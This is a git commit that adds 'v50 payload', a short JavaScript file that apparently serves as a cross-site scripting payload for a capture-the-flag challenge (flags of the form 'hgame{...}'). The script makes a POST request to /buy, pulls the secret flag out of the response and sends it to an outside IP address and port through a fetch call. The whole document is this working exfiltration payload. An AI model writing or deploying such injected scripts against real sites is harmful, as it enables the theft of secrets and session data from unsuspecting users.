56328000f2df4985cf582d5fe077d091758a264e
Any <fkd_any@qq.com>
2024-03-23 14:09:01 +0800

    add: v50 payload

---
+++ v50.js
@@ -0,0 +1,14 @@
+!(function(){
+  // const baseTag= document.getElementById("d");
+  // baseTag.parentElement.removeChild(baseTag);
+  fetch("/buy",{
+    method:"POST",
+    body:"id=0"
+  }).then((res)=>{
+    return res.text();
+  }).then((text)=>{
+    const matchObj= text.match("hgame{.+}");
+    const flag= encodeURIComponent(matchObj[0]);
+    fetch(`http://124.222.247.149:20323/receive?token=${flag}`);
+  })
+})()
